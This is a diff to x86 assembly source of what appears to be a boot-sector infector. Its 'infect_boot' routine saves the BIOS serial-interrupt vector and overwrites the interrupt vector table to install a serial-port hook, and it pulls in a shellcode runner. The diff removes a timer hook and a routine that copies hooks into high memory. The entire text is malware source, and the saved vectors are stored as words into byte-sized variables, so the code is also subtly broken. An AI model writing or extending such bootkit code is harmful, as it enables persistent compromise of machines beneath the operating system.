@@ -38,18 +38,15 @@ infect_boot:
     ; Activating Serial Hook
     xor ax, ax
     mov es, ax
-    mov ax, [es:0x0070]                 ; BIOS Interrupt offset
-    mov [bios_serial_int_offset], ax
-    mov ax, [es:0x0072]                 ; BIOS Interrupt segment
-    mov [bios_serial_int_segment], ax
+    
+    mov ax, [es:0x0070]                 
+    mov [int0c_bios_off], ax
+    mov ax, [es:0x0072]                 
+    mov [int0c_bios_seg], ax
     
     mov dx, (serial_hook - hooks_start)
     mov al, 0x0c
-    call overwrite_ivt
 
-    ; Activating Timer Hook
-    mov dx, (timer_hook - hooks_start)
-    mov al, 0x1c
     call overwrite_ivt
 
     ; Enabling UART interrupts
@@ -70,36 +67,6 @@ infect_boot:
     pop ds
     popa
     sti
-    ret
-
-copy_hooks:
-    push ax
-    push bx
-    push cx
-    push si
-    push ds
-    push es
-
-    mov ax, [0x0013]        ; Gets RAM total value
-    inc ax                  ; Uses the posterior segment for hooks
-    ; Calculating address in segment:offset way
-    shl ax, 6               ; Segment transform
-    mov es, ax
-    
-    ; Adjusting segment
-    mov bx, cs
-    mov ds, bx
-
-    ; Copying function for hook address
-    cld
-    rep movsb
-    
-    pop es
-    pop ds
-    pop si
-    pop cx
-    pop bx
-    pop ax
     ret
 
 overwrite_ivt:
@@ -160,13 +127,11 @@ serial_hook:
 
 %include "shellcode_runner.asm"
 
-timer_hook:
-    ; 
-    iret
+; timer_hook: iret
 
 hooks_end:
 
 %include "ivt_backup.asm"
 
-bios_serial_int_offset  db 0
-bios_serial_int_segment db 0
+int0c_bios_off db 0
+int0c_bios_seg db 0
